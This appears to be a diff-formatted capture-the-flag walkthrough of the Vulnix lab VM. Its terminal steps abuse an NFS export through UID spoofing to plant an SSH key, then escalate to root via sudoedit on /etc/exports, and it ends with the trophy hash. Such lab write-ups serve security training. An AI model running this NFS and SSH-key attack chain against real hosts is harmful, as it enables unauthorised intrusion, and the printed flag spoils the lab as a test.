@@ -1,0 +1,50 @@
+root@kali:~/Documents/Vulnix# showmount -e 192.168.1.139
+clnt_create: RPC: Port mapper failure - Unable to send: errno 101 (Network is unreachable)
+root@kali:~/Documents/Vulnix# showmount -e 192.168.1.139
+Export list for 192.168.1.139:
+/home/vulnix *
+root@kali:~/Documents/Vulnix# mount -t nfs 192.168.1.139:/home/vulnix /mnt -o vers=2
+
+root@kali:/mnt# ls -l /
+drwxr-x---   2    2008     2008  4096 Sep  3  2012 mnt
+
+root@kali:/mnt# useradd -s /bin/bash -u 2008 vulnix
+root@kali:/mnt# passwd vulnix
+root@kali:/mnt# su vulnix
+vulnix@kali:/mnt$ 
+
+drwxr-x---   2 vulnix  vulnix    4096 Sep  3  2012 mnt
+
+Create SSH:
+
+vulnix@kali:/mnt$ mkdir .ssh
+vulnix@kali:/mnt/.ssh$ ssh-keygen
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/vulnix/.ssh/id_rsa): vulnix@kindred
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+
+vulnix@kali:/mnt/.ssh$ mv vulnix@kindred.pub authorized_keys
+
+vulnix@kali:/mnt/.ssh$ cat vulnix@kindred 
+-----BEGIN RSA PRIVATE KEY-----
+-----END RSA PRIVATE KEY-----
+Copy to your work folder and "set permission" for your key:
+root@kali:~/Documents/Vulnix# chmod 600 vulnix@kindred 
+ssh -i vulnix@kindred -l vulnix 192.168.1.139
+
+PE:
+vulnix@vulnix:~$ sudo -l
+User vulnix may run the following commands on this host:
+    (root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports
+vulnix@vulnix:~$ sudoedit /etc/exports
+
+
+Reboot VM manually:
+root@kali:~/Documents/Vulnix/mount# cat trophy.txt 
+cc614640424f5bd60ce5d5264899c3be
+
+
+
+
+
